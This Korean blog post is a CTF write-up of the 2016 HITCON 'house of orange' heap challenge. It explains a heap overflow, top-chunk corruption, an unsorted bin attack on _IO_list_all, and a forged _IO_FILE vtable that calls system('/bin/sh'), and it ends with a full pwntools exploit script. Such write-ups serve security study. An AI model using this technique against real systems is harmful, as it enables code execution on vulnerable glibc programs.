---
layout: post
title: "[2016 hitcon-ctf] house of orange 풀이"
date: 2018-09-27 04:44
categories: "[Pwn]CTF"
tags: rotles98
---

>### My teammate, Orange, need a house. Can you build it ? nc 52.68.192.99 56746

`selfmade orange! Ooh! Ooh!`

- - -
# 0x00. 분석

{: refdef: style="text-align: center;"}
![checksec](/img/2016_hitcon-ctf/house_of_orange/01.png)
{: refdef}

`house_of_orange`는 `TOP_chunk`를 조작하고 덮고 해서 일부로 에러가 발생하게해요.

그리곤 에러가 발생할 때 사용하는 코드를 보고 적당히 비틀어서 `fake_struct`가 인자로 들어가도록 하고

특정 함수 대신 `system("/bin/sh\0")`가 실행되게 하는게 목적이에요.

`func_build`

1. `house_count`가 3 초과인지 확인

2. 아니면 `malloc(0x10)`으로 `house_chunk`할당

3. 이름의 길이 입력 (최대 0x1000)

4. `house_chunk -> house_name`에 입력한 길이만큼 할당받아서 저장 및 이름 입력

5. `orange_price`, `orange_color` 입력

6. `head_house`를 방금 만든 `house_chunk`로 바꾸고 `house_count` 증가<br /><br />

`func_see`

1. `head_house`에 있는 `chunk`를 바탕으로 `house_name`, `orange_price`, `orange_color` 출력<br /><br />

`func_upgrade`

1. `upgrade_count`가 2 초과인지 확인

2. 아니면 `head_house`가 존재하는지 확인

3. 존재하면 이름의 길이 입력 (최대 0x1000)

4. 이름을 입력하는데 원래 존재하던 이름의 길이를 검사하지 않음 **!!bof!!**

5. `oragne_price`, `orange_color` 입력

6. `upgrade_count` 증가<br /><br />

- - -
# 0x01. house_of_orange

우선 이 바이너리도 그렇게 이 기법 자체도 그런데 `free`가 따로 필요없어요.

그냥 `TOP_chunk`만 적당히 조절해주면 되는데 만약 `0x20fa1`이 원래 `TOP_chunk` 값이면 `0xfa1` 이렇게 바꿔주면 돼요.

그리곤 `TOP_chunk`보다 큰 크기로 `malloc`하면 `TOP_chunk`가 `free`되고 다른 곳에 새로 생기는데 이렇게 억지로 만든 `free`로 `libc_leak`, `heap_leak`을 할 수 있어요.

나중에 새로 생긴 `TOP_chunk`를 다른 값으로 덮어서 에러가 발생하도록 의도할건데 화면에 에러가 출력되는 과정이 [이 글](http://tech.c2w2m2.com/pwn/house-of-orange/)에 잘 설명돼 있어요.

{: refdef: style="text-align: center;"}
![_IO_flush_all_lookup](/img/2016_hitcon-ctf/house_of_orange/02.png)
{: refdef}

제일 중요한건 위 코드가 실행된다는 거에요.

위 코드에서 `695`, `706` 코드가 중요해요.

`695`는 `fp = fp -> _chain`으로 반복하는데 `_chain` 부분을 `fake_struct`를 향하게 만들면 `if`문을 마음대로 우회할 수 있어요.

`706`은 `_IO_OVERFLOW`는 다른 함수의 주소를 가지고 있는데 이 부분을 `system`의 주소가 들어가도록 잘 하면 `system(fp)`가 실행돼요.

- - -
# 0x02. struct

위 코드를 다시 보면 `fp = (FILE *) _IO_list_all`처럼 `FILE` 구조체로 받아와요.

> https://code.woboq.org/userspace/glibc/libio/bits/types/FILE.h.html#FILE

저기서 보면 `_IO_FILE`이랑 `FILE`이랑 같아요.

그래서 `_IO_FILE`의 구조체를 봐야해요.

```c
struct _IO_FILE
{
	int _flags;

	char *_IO_read_ptr;
	char *_IO_read_end;
	char *_IO_read_base;
	char *_IO_write_base;
	char *_IO_write_ptr;
	char *_IO_write_end;
	char *_IO_buf_base;
	char *_IO_buf_end;

	char *_IO_save_base;
	char *_IO_backup_base;
	char *_IO_save_end;

	struct  _IO_marker *_markers;

	struct  _IO_FILE *_chain;

	int _fileno;
	int _flags2;

	__off_t _old_offset;

	unsigned short _cur_column;
	signed char _vtable_offset;
	char _shortbuf[1];

	_IO_lock_t *_lock;

	__off64_t _offset;

	struct _IO_codecvt *_codecvt;
	struct _IO_wide_data *_wide_data;
	struct _IO_FILE *_freeres_list;
	void *_freeres_buf;
	size_t __pad5;
	int _mode;

	char _unused2[15 * sizeof(int) - 4 * sizeof(void *) - sizeof(size_t)];
};
```

> https://code.woboq.org/userspace/glibc/libio/bits/types/struct_FILE.h.html#_IO_FILE

~~위 사이트에선 *_lock까지만 _IO_FILE이고 그 다음은 _IO_FILE_complete 부분에 정의됐는데 그건 왜 그런지 모르겠음~~

근데 이렇게 보면 `_chain`이 정확히 어디있는지 잘 모르니까 `gdb`를 써서 정확한 위치를 찾을 거에요.

> p &((struct _IO_FILE *) 0) -> _chain

이런식으로 검색해서 정확한 위치를 찾을 수 있어요.

`fp = (FILE *) _IO_list_all` 이걸 다시 보면 `_IO_list_all`을 사용해요.

{: refdef: style="text-align: center;"}
![_IO_list_all](/img/2016_hitcon-ctf/house_of_orange/03.png)
{: refdef}

> https://code.woboq.org/userspace/glibc/libio/libioP.h.html#_IO_list_all

근데 `_IO_list_all`은 `_IO_FILE_plus` 구조를 가져요.

> https://code.woboq.org/userspace/glibc/libio/libioP.h.html#_IO_FILE_plus

`_IO_FILE_plus`는 `_IO_FILE` 다음에 `_IO_jump_t`라고 다른 함수의 주소를 담고있는 구조체가 있어요. 여기서 `_IO_OVERFLOW`의 값을 덮을 수 있어요.

```c
struct _IO_jump_t
{
	JUMP_FIELD(size_t, __dummy);
	JUMP_FIELD(size_t, __dummy2);
	JUMP_FIELD(_IO_finish_t, __finish);
	JUMP_FIELD(_IO_overflow_t, __overflow);
	...
};
```

다시 위에 `if`문을 보면 `_IO_OVERFLOW`를 실행시키려면 조건이 있어여.

> `fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base` or `_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base

조건은 두 가지중 하나만 만족하면 돼요. 누가봐도 쉬워보이는 앞에 조건으로 할게요.

그럼 위치를 알아야하는게

1. \_IO\_FILE -> \_chain

2. \_IO\_FILE -> \_mode

3. \_IO\_FILE -> \_IO\_write\_base (ptr은 바로 다음)

4. \_IO\_jump\_t -> \_\_overflow

{: refdef: style="text-align: center;"}
![offset](/img/2016_hitcon-ctf/house_of_orange/04.png)
{: refdef}

- - -
# 0x03. 공격 방법

뭐 다들 이 글 말고 다른 글도 많이 찾아보셔서 대충 말해도 다 알아들을거라 믿어요.

`unsroted_bin_attack`으로 `_IO_list_all`을 `main_arena+88`로 덮어줘요. (`fp = (FILE *) _IO_list_all`)

{: refdef: style="text-align: center;"}
![unsorted_bin_attack](/img/2016_hitcon-ctf/house_of_orange/05.png)
{: refdef}

`_IO_FILE` 구조체로 `main_arena+88`을 출력해서 보면 `_chain` 부분에 `main_arena+168`이 들어가 있어요.

저 부분은 `smallbin[4]`라서 `0x60` 크기의 `chunk` 주소가 들어가요. 만약 새로 생긴 `TOP_chunk` 부분의 `size`가 `0x61`이면 일단 `main_arena`의 `smallbin[4]`에 해당 주소가 들어가고 나중에 정상적인 값인지 검사하다가 에러가 떠요.

{: refdef: style="text-align: center;"}
![overwite_chain](/img/2016_hitcon-ctf/house_of_orange/06.png)
{: refdef}

`TOP_chunk`를 덮고 `malloc`을 했울 때 모습인데 `_chain`에 `TOP_chunk`의 주소가 들어간걸 볼 수 있어요. 그래서 원래 `TOP_chunk`가 있는 곳에 `fake_IO_FILE`을 만들어주고 나머진 조건에 맞게 쓱쓱 해주면 풀려요.

- - -
# 0x04. 익스플로잇

이정도면 나름 자세하게 쓴듯

```python
from pwn import *
#context.log_level = "debug"

HOST = "192.168.0.19"
#HOST = "52.68.192.99"
PORT = 4444
#PORT = 56746

s = remote(HOST, PORT)
pause()

elf = ELF("./house_of_orange")
libc = ELF("./libc.so.6")

libc_off = 0x3c5188
system_off = libc.symbols["system"]
IO_list_all_off = libc.symbols["_IO_list_all"]

heap_off = 0x130
fake_IO_jump_t_off = 0x640

def func_build(size, name):
    s.recvuntil("Your choice : ")
    s.sendline("1")

    s.recvuntil("Length of name :")
    s.sendline(str(size))

    s.recvuntil("Name :")
    s.send(name)

    s.recvuntil("Price of Orange:")
    s.sendline(str(0x18))

    s.recvuntil("Color of Orange:")
    s.sendline(str(0xddaa))

def func_see():
    s.recvuntil("Your choice : ")
    s.sendline("2")

def func_upgrade(size, name):
    s.recvuntil("Your choice : ")
    s.sendline("3")

    s.recvuntil("Length of name :")
    s.sendline(str(size))

    s.recvuntil("Name:")
    s.send(name)

    s.recvuntil("Price of Orange: ")
    s.sendline(str(0x18))

    s.recvuntil("Color of Orange: ")
    s.sendline(str(0xddaa))

func_build(0x88, "A" * 0x88)
payload = "A" * 0x88
payload += p64(0x21) # orange size
payload += p32(0x18) # orange price
payload += p32(0xddaa) # orange color
payload += "A" * 0x10
payload += p64(0xf31) # TOP_chunk
func_upgrade(len(payload), payload)

# house_of_orange
func_build(0xff8, "A" * 0xff8)

# libc_leak
func_build(0x408, "A" * 0x8)
func_see()
s.recvuntil("Name of house : " + "A" * 0x8)
libc_leak = u64(s.recvuntil("\x7f").ljust(0x8, "\x00"))

libc_base = libc_leak - libc_off
libc_system = libc_base + system_off
libc_IO_list_all = libc_base + IO_list_all_off

print
log.info("libc_base : " + hex(libc_base))
log.info("libc_system : " + hex(libc_system))
log.info("libc_IO_list_all : " + hex(libc_IO_list_all))
print

# heap_leak
func_upgrade(0x408, "A" * 0x10)
func_see()
s.recvuntil("Name of house : " + "A" * 0x10)
heap_leak = u64(s.recvuntil("\n")[:-1].ljust(0x8, "\x00"))

heap_base = heap_leak - heap_off
fake_IO_jump_t = heap_base + fake_IO_jump_t_off

log.info("heap_base : " + hex(heap_base))
log.info("fake_IO_jump_t : " + hex(fake_IO_jump_t))
print

# fake _IO_FILE
_IO_FILE = "/bin/sh\0" # fake_chunk -> prev_size
_IO_FILE += p64(0x61) # fake_chunk -> size
_IO_FILE += "A" * 0x8 # fake_chunk -> fd
_IO_FILE += p64(libc_IO_list_all - 0x10) # fake_chunk -> bk, unsorted_bin_attack

_IO_FILE += p64(0x0) # _IO_FILE -> _IO_write_base
_IO_FILE += p64(0x1) # _IO_FILE -> _IO_write_ptr

_IO_FILE = _IO_FILE.ljust(0xc0, "\x00")
_IO_FILE += p64(0x0) # _IO_FILE -> _mode

_IO_FILE = _IO_FILE.ljust(0xd8, "\x00")
_IO_FILE += p64(fake_IO_jump_t)

# fake _IO_jump_t
_IO_jump_t = "\x00" * 0x18
_IO_jump_t += p64(libc_system) # __overflow

payload = "A" * 0x420
payload += _IO_FILE
payload += _IO_jump_t

func_upgrade(len(payload), payload)

# exploit
s.recvuntil("Your choice : ")
s.sendline("1")

s.interactive()
```

### hitcon{Y0ur_4r3_the_g0d_of_h34p_4nd_Or4ng3_is_s0_4ngry}

- - -
# 참고한 사이트

https://1ce0ear.github.io/2017/11/26/study-house-of-orange/

https://www.lazenca.net/display/TEC/House%2Bof%2BOrange

http://tech.c2w2m2.com/pwn/house-of-orange/

http://asiagaming.tistory.com/170

https://hicrhodus.xyz/timisoara-ctf-2018-quals-heapschool102/ (다른 문제지만 `house_of_oragne` 기법을 사용함)

https://code.woboq.org (소스 코드)
